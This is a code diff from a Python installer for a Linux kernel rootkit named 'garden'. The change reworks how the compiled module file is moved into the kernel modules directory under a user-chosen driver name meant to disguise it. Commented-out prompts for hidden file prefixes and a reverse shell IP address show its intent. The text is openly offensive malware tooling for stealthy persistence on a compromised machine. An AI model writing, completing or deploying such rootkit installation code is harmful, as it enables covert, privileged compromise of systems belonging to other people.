@@ -158,7 +158,7 @@ def install(kernel_version):
 	print_status("Starting rootkit installation...")
 
 	config = {}
-	config["MODULE_NAME"] = "garden"
+	config["MODULE_NAME"] = "garden.ko"
 	config["DRIVER_NAME"] = prompt("Enter the name of a kernel driver to disguise your rootkit.", "garden")
 	# config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", "Garden")
 	# config["REVERSE_SHELL_IP_ADDR"] = prompt("Enter IP address for reverse shell.")
@@ -176,15 +176,16 @@ def install(kernel_version):
 
 	# TODO: Move compiled components to the right place. Maybe drop it in "/lib/modules/{0}/garden?
 	print_status("Installing rootkit...")
-	module_dir = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, config["DRIVER_NAME"])
-	if not os.path.exists(module_dir):
-		os.mkdir(module_dir)
+	module_dest_path = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, config["DRIVER_NAME"])
+	if not os.path.exists(module_dest_path):
+		os.mkdir(module_dest_path)
 
-	module_dest_path = module_dir + ".ko"
+	module_curr_path = "./rootkit/{}".format(config["MODULE_NAME"])
 
+	# Move the compiled kernel module to the kernel modules directories.
 	try:
-		# TODO: Decide if moving the .ko file to the module_dir is necessary
-		move("rootkit/{}.ko".format(config["MODULE_NAME"]), module_dest_path)
+		print_status("Moving {} to {}.".format(module_curr_path, module_dest_path))
+		move(module_curr_path, module_dest_path)
 	except IOError as e:
 		print_error("Unable to copy file. {}".format(e))
 		sys.exit()
